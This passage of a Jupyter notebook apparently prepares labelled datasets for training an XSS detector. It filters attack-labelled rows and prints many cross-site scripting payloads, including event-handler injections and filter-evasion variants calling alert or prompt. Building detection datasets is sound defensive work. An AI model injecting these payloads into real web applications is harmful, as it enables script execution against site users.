       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;meter id=x tabindex=1 onbeforedeactivate=aler...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;em draggable=\"true\" ondragleave=\"alert(1)\"&gt;te...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;small onbeforecut=\"alert(1)\" contenteditable&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;article draggable=\"true\" ondragstart=\"alert(1...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;cite onkeyup=\"alert(1)\" contenteditable&gt;test&lt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14743</th>\n",
       "      <td>&lt;data draggable=\"true\" ondragstart=\"alert(1)\"&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14744</th>\n",
       "      <td>&lt;sub draggable=\"true\" ondragend=\"alert(1)\"&gt;tes...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14745</th>\n",
       "      <td>&lt;dialog draggable=\"true\" ondragenter=\"alert(1)...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14746</th>\n",
       "      <td>&lt;iframe onblur=alert(1) id=x&gt;&lt;input autofocus&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14747</th>\n",
       "      <td>&lt;legend id=x tabindex=1 ondeactivate=alert(1)&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>14748 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <meter id=x tabindex=1 onbeforedeactivate=aler...    1\n",
       "1      <em draggable=\"true\" ondragleave=\"alert(1)\">te...    1\n",
       "2      <small onbeforecut=\"alert(1)\" contenteditable>...    1\n",
       "3      <article draggable=\"true\" ondragstart=\"alert(1...    1\n",
       "4      <cite onkeyup=\"alert(1)\" contenteditable>test<...    1\n",
       "...                                                  ...  ...\n",
       "14743  <data draggable=\"true\" ondragstart=\"alert(1)\">...    1\n",
       "14744  <sub draggable=\"true\" ondragend=\"alert(1)\">tes...    1\n",
       "14745  <dialog draggable=\"true\" ondragenter=\"alert(1)...    1\n",
       "14746     <iframe onblur=alert(1) id=x><input autofocus>    1\n",
       "14747  <legend id=x tabindex=1 ondeactivate=alert(1)>...    1\n",
       "\n",
       "[14748 rows x 2 columns]"
      ]
     },
     "execution_count": 787,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_dsm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 788,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_dsm.to_csv(\"../Datasets/Processed/xss_dsm.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### our_Dataset.xlsx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 789,
   "metadata": {},
   "outputs": [],
   "source": [
    "od = pd.read_excel(\"../Datasets/our_dataset.xlsx\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 790,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "sentence",
         "rawType": "object",
         "type": "unknown"
        },
        {
         "name": "type / status",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "attack type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "request method (POST/GET)",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "param as ( body / URL )",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "success attack (impact/effect)",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "http status",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Note in result",
         "rawType": "object",
         "type": "unknown"
        },
        {
         "name": "length char +13 ( \"New Question \")",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Unnamed: 9",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Unnamed: 10",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Unnamed: 11",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "18517d18-fe7a-459e-b221-b4ce185e37a3",
       "rows": [
        [
         "0",
         "-3752",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         null,
         "18",
         null,
         null,
         null
        ],
        [
         "1",
         "00:00:00",
         "0",
         "No Attack",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         null,
         "14",
         null,
         null,
         null
        ],
        [
         "2",
         "0",
         "0",
         "No Attack",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         null,
         "14",
         null,
         null,
         null
        ],
        [
         "3",
         "0.21",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         null,
         "17",
         null,
         null,
         null
        ],
        [
         "4",
         "0.26",
         "1",
         "SQL Injection",
         "POST",
         "body (Q.)",
         "0",
         "201.0",
         null,
         "17",
         null,
         null,
         null
        ]
       ],
       "shape": {
        "columns": 12,
        "rows": 5
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sentence</th>\n",
       "      <th>type / status</th>\n",
       "      <th>attack type</th>\n",
       "      <th>request method (POST/GET)</th>\n",
       "      <th>param as ( body / URL )</th>\n",
       "      <th>success attack (impact/effect)</th>\n",
       "      <th>http status</th>\n",
       "      <th>Note in result</th>\n",
       "      <th>length char +13 ( \"New Question \")</th>\n",
       "      <th>Unnamed: 9</th>\n",
       "      <th>Unnamed: 10</th>\n",
       "      <th>Unnamed: 11</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>-3752</td>\n",
       "      <td>1</td>\n",
       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>18</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>00:00:00</td>\n",
       "      <td>0</td>\n",
       "      <td>No Attack</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>14</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>No Attack</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>14</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0.21</td>\n",
       "      <td>1</td>\n",
       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>17</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0.26</td>\n",
       "      <td>1</td>\n",
       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>NaN</td>\n",
       "      <td>17</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   sentence  type / status    attack type request method (POST/GET)  \\\n",
       "0     -3752              1  SQL Injection                      POST   \n",
       "1  00:00:00              0      No Attack                      POST   \n",
       "2         0              0      No Attack                      POST   \n",
       "3      0.21              1  SQL Injection                      POST   \n",
       "4      0.26              1  SQL Injection                      POST   \n",
       "\n",
       "  param as ( body / URL )  success attack (impact/effect)  http status  \\\n",
       "0               body (Q.)                               0        201.0   \n",
       "1               body (Q.)                               0        201.0   \n",
       "2               body (Q.)                               0        201.0   \n",
       "3               body (Q.)                               0        201.0   \n",
       "4               body (Q.)                               0        201.0   \n",
       "\n",
       "  Note in result  length char +13 ( \"New Question \")  Unnamed: 9  Unnamed: 10  \\\n",
       "0            NaN                                  18         NaN          NaN   \n",
       "1            NaN                                  14         NaN          NaN   \n",
       "2            NaN                                  14         NaN          NaN   \n",
       "3            NaN                                  17         NaN          NaN   \n",
       "4            NaN                                  17         NaN          NaN   \n",
       "\n",
       "   Unnamed: 11  \n",
       "0          NaN  \n",
       "1          NaN  \n",
       "2          NaN  \n",
       "3          NaN  \n",
       "4          NaN  "
      ]
     },
     "execution_count": 790,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "od.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 791,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 160128 entries, 0 to 160127\n",
      "Data columns (total 12 columns):\n",
      " #   Column                              Non-Null Count   Dtype  \n",
      "---  ------                              --------------   -----  \n",
      " 0   sentence                            160128 non-null  object \n",
      " 1   type / status                       160128 non-null  int64  \n",
      " 2   attack type                         160128 non-null  object \n",
      " 3   request method (POST/GET)           160128 non-null  object \n",
      " 4   param as ( body / URL )             160128 non-null  object \n",
      " 5   success attack (impact/effect)      160128 non-null  int64  \n",
      " 6   http status                         160120 non-null  float64\n",
      " 7   Note in result                      113886 non-null  object \n",
      " 8   length char +13 ( \"New Question \")  160128 non-null  int64  \n",
      " 9   Unnamed: 9                          0 non-null       float64\n",
      " 10  Unnamed: 10                         0 non-null       float64\n",
      " 11  Unnamed: 11                         6934 non-null    float64\n",
      "dtypes: float64(4), int64(3), object(5)\n",
      "memory usage: 14.7+ MB\n"
     ]
    }
   ],
   "source": [
    "od.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 792,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "attack type\n",
       "No Attack        78051\n",
       "SQL Injection    59955\n",
       "XSS              22122\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 792,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "od = od[[\"sentence\", \"attack type\"]]\n",
    "od[\"attack type\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 793,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1878789914.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_od.rename(columns={\"sentence\": \"payload\", \"attack type\": \"xss\"}, inplace=True)\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1878789914.py:4: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_od[\"xss\"] = xss_od[\"xss\"].apply(lambda x: 1 if x == \"XSS\" else 0)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "4a12fb5b-3ef3-43ea-b278-538e144ede96",
       "rows": [
        [
         "0",
         "<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>",
         "1"
        ],
        [
         "1",
         "<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>",
         "1"
        ],
        [
         "2",
         "<small onbeforecut=\"alert(1)\" contenteditable>test</small>",
         "1"
        ],
        [
         "3",
         "<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "4",
         "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>",
         "1"
        ],
        [
         "5",
         "<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>",
         "1"
        ],
        [
         "6",
         "<data onpointerleave=alert(1)>XSS</data>",
         "1"
        ],
        [
         "7",
         "<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "8",
         "<dd onbeforecopy=\"alert(1)\" contenteditable>test</dd>",
         "1"
        ],
        [
         "9",
         "<del id=x tabindex=1 onactivate=alert(1)></del>",
         "1"
        ],
        [
         "10",
         "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>",
         "1"
        ],
        [
         "11",
         "<optgroup onpointerover=alert(1)>XSS</optgroup>",
         "1"
        ],
        [
         "12",
         "<audio onpointermove=alert(1)>XSS</audio>",
         "1"
        ],
        [
         "13",
         "<aside onmouseout=\"alert(1)\">test</aside>",
         "1"
        ],
        [
         "14",
         "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "15",
         "<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",
         "1"
        ],
        [
         "16",
         "<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>",
         "1"
        ],
        [
         "17",
         "<object onmousedown=\"alert(1)\">test</object>",
         "1"
        ],
        [
         "18",
         "<area onbeforepaste=\"alert(1)\" contenteditable>test</area>",
         "1"
        ],
        [
         "19",
         "<template onpointerout=alert(1)>XSS</template>",
         "1"
        ],
        [
         "20",
         "<s onpointerup=alert(1)>XSS</s>",
         "1"
        ],
        [
         "21",
         "<select draggable=\"true\" ondrag=\"alert(1)\">test</select>",
         "1"
        ],
        [
         "22",
         "<a onmouseup=\"alert(1)\">test</a>",
         "1"
        ],
        [
         "23",
         "<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>",
         "1"
        ],
        [
         "24",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>",
         "1"
        ],
        [
         "25",
         "<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>",
         "1"
        ],
        [
         "26",
         "<time onclick=\"alert(1)\">test</time>",
         "1"
        ],
        [
         "27",
         "<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "28",
         "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>",
         "1"
        ],
        [
         "29",
         "<center onclick=\"alert(1)\">test</center>",
         "1"
        ],
        [
         "30",
         "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>",
         "1"
        ],
        [
         "31",
         "<div onkeyup=\"alert(1)\" contenteditable>test</div>",
         "1"
        ],
        [
         "32",
         "<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>",
         "1"
        ],
        [
         "33",
         "<dl draggable=\"true\" ondrag=\"alert(1)\">test</dl>",
         "1"
        ],
        [
         "34",
         "<div onpointerout=alert(1)>XSS</div>",
         "1"
        ],
        [
         "35",
         "<style>:target {color:red;}</style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></slot>",
         "1"
        ],
        [
         "36",
         "<applet onmouseover=\"alert(1)\">test</applet>",
         "1"
        ],
        [
         "37",
         "<figure onbeforecut=\"alert(1)\" contenteditable>test</figure>",
         "1"
        ],
        [
         "38",
         "<canvas onmousemove=\"alert(1)\">test</canvas>",
         "1"
        ],
        [
         "39",
         "<h1 onpaste=\"alert(1)\" contenteditable>test</h1>",
         "1"
        ],
        [
         "40",
         "<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>",
         "1"
        ],
        [
         "41",
         "<textarea onpointermove=alert(1)>XSS</textarea>",
         "1"
        ],
        [
         "42",
         "document.write",
         "1"
        ],
        [
         "43",
         "<area onpointerenter=alert(1)>XSS</area>",
         "1"
        ],
        [
         "44",
         "<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>",
         "1"
        ],
        [
         "45",
         "<audio oncontextmenu=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "46",
         "<isindex onpointerup=alert(1)>XSS</isindex>",
         "1"
        ],
        [
         "47",
         "<strike onmouseup=\"alert(1)\">test</strike>",
         "1"
        ],
        [
         "48",
         "<kbd id=x tabindex=1 onfocus=alert(1)></kbd>",
         "1"
        ],
        [
         "49",
         "<table onbeforepaste=\"alert(1)\" contenteditable>test</table>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 22122
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;meter id=x tabindex=1 onbeforedeactivate=aler...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;em draggable=\"true\" ondragleave=\"alert(1)\"&gt;te...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;small onbeforecut=\"alert(1)\" contenteditable&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;article draggable=\"true\" ondragstart=\"alert(1...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;cite onkeyup=\"alert(1)\" contenteditable&gt;test&lt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22117</th>\n",
       "      <td>&lt;data draggable=\"true\" ondragstart=\"alert(1)\"&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22118</th>\n",
       "      <td>&lt;sub draggable=\"true\" ondragend=\"alert(1)\"&gt;tes...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22119</th>\n",
       "      <td>&lt;dialog draggable=\"true\" ondragenter=\"alert(1)...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22120</th>\n",
       "      <td>&lt;iframe onblur=alert(1) id=x&gt;&lt;input autofocus&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22121</th>\n",
       "      <td>&lt;legend id=x tabindex=1 ondeactivate=alert(1)&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>22122 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <meter id=x tabindex=1 onbeforedeactivate=aler...    1\n",
       "1      <em draggable=\"true\" ondragleave=\"alert(1)\">te...    1\n",
       "2      <small onbeforecut=\"alert(1)\" contenteditable>...    1\n",
       "3      <article draggable=\"true\" ondragstart=\"alert(1...    1\n",
       "4      <cite onkeyup=\"alert(1)\" contenteditable>test<...    1\n",
       "...                                                  ...  ...\n",
       "22117  <data draggable=\"true\" ondragstart=\"alert(1)\">...    1\n",
       "22118  <sub draggable=\"true\" ondragend=\"alert(1)\">tes...    1\n",
       "22119  <dialog draggable=\"true\" ondragenter=\"alert(1)...    1\n",
       "22120     <iframe onblur=alert(1) id=x><input autofocus>    1\n",
       "22121  <legend id=x tabindex=1 ondeactivate=alert(1)>...    1\n",
       "\n",
       "[22122 rows x 2 columns]"
      ]
     },
     "execution_count": 793,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_od = od[od[\"attack type\"] == \"XSS\"]\n",
    "xss_od.rename(columns={\"sentence\": \"payload\", \"attack type\": \"xss\"}, inplace=True)\n",
    "xss_od.reset_index(drop=True, inplace=True)\n",
    "xss_od[\"xss\"] = xss_od[\"xss\"].apply(lambda x: 1 if x == \"XSS\" else 0)\n",
    "xss_od"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 794,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_od.to_csv(\"../Datasets/Processed/xss_od.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### payloads.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 795,
   "metadata": {},
   "outputs": [],
   "source": [
    "payloads = open(\"../Datasets/payloads.txt\", \"r\", )\n",
    "payloads = [payload.strip() for payload in payloads.readlines()]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 796,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\"-prompt(8)-\"',\n",
       " \"'-prompt(8)-'\",\n",
       " '\";a=prompt,a()//',\n",
       " \"';a=prompt,a()//\",\n",
       " '\\'-eval(\"window[\\'pro\\'%2B\\'mpt\\'](8)\")-\\'',\n",
       " '\"-eval(\"window[\\'pro\\'%2B\\'mpt\\'](8)\")-\"',\n",
       " '\"onclick=prompt(8)>\"@x.y',\n",
       " '\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y',\n",
       " '<image/src/onerror=prompt(8)>',\n",
       " '<img/src/onerror=prompt(8)>',\n",
       " '<image src/onerror=prompt(8)>',\n",
       " '<img src/onerror=prompt(8)>',\n",
       " '<image src =q onerror=prompt(8)>',\n",
       " '<img src =q onerror=prompt(8)>',\n",
       " '</scrip</script>t><img src =q onerror=prompt(8)>',\n",
       " '<script\\\\x20type=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x3Etype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x09type=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '<script\\\\x0Atype=\"text/javascript\">javascript:alert(1);</script>',\n",
       " '\\'`\"><\\\\x3Cscript>javascript:alert(1)</script>',\n",
       " '\\'`\"><\\\\x00script>javascript:alert(1)</script>',\n",
       " '<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>',\n",
       " '<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>',\n",
       " '<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>',\n",
       " '<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>',\n",
       " '<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>',\n",
       " '<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>',\n",
       " '<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>',\n",
       " '<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>',\n",
       " '<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>',\n",
       " '<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>',\n",
       " '<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>',\n",
       " '<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>',\n",
       " '<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>',\n",
       " '<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>',\n",
       " '<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>',\n",
       " '<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>',\n",
       " '<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>',\n",
       " '<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>',\n",
       " '<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>',\n",
       " '<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>',\n",
       " '<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>',\n",
       " '<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>',\n",
       " '<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>',\n",
       " '<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>',\n",
       " '<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>',\n",
       " '<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>',\n",
       " '<body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow>',\n",
       " '<style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"></style onReadyStateChange>',\n",
       " '<frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus>',\n",
       " '<applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError>',\n",
       " '<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>',\n",
       " '<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>',\n",
       " '<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>',\n",
       " '<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>',\n",
       " '<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>',\n",
       " '<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>',\n",
       " '<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>',\n",
       " '<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>',\n",
       " '<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>',\n",
       " '<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>',\n",
       " '<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>',\n",
       " '<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>',\n",
       " '<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>',\n",
       " '<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>',\n",
       " '<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>',\n",
       " '<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>',\n",
       " '<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>',\n",
       " '<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>',\n",
       " '<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>',\n",
